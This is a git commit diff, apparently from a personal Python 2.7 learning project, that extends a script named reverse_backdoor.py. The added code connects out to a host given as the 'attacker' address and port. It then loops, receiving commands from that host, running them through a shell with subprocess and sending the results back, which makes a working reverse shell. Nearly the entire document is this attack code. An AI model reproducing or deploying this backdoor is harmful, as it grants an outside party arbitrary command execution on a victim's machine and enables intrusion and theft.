5e5a9ced0c34f857f1806d054c8a63d87014e3d8
Ryan Spishock <22054759+rspishock@users.noreply.github.com>
2020-09-01 20:07:01 -0400

    Add system command reversal to script.

--- Python 2_7_16/reverse_backdoor.py
+++ Python 2_7_16/reverse_backdoor.py
@@ -2,8 +2,10 @@
 """A simple reverse backdoor script.
    Uses Python 2.7.16"""
 
+import subprocess
 import optparse
 import socket
+
 
 def get_arguments():
     """Get user supplied arguments from terminal."""
@@ -17,8 +19,20 @@ def get_arguments():
     return options
 
 
+def execute_system_command(command):
+    return subprocess.check_output(command, shell=True)
+
+
 options = get_arguments()
 
-
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # IPv4 and TCP
-connection.connect((options.attacker, options.port))
+connection.connect((options.attacker, options.port))            # establishes connection
+
+connection.send('\n[+] Connection established.\n')              # verifies to attacker that connection is valid
+
+while True:
+    command = connection.recv(1024)                             # receives data from attacker max 1024 bytes at a time
+    command_result = execute_system_command(command)
+    connection.send(command_result)
+
+connection.close()                                              # closes connection
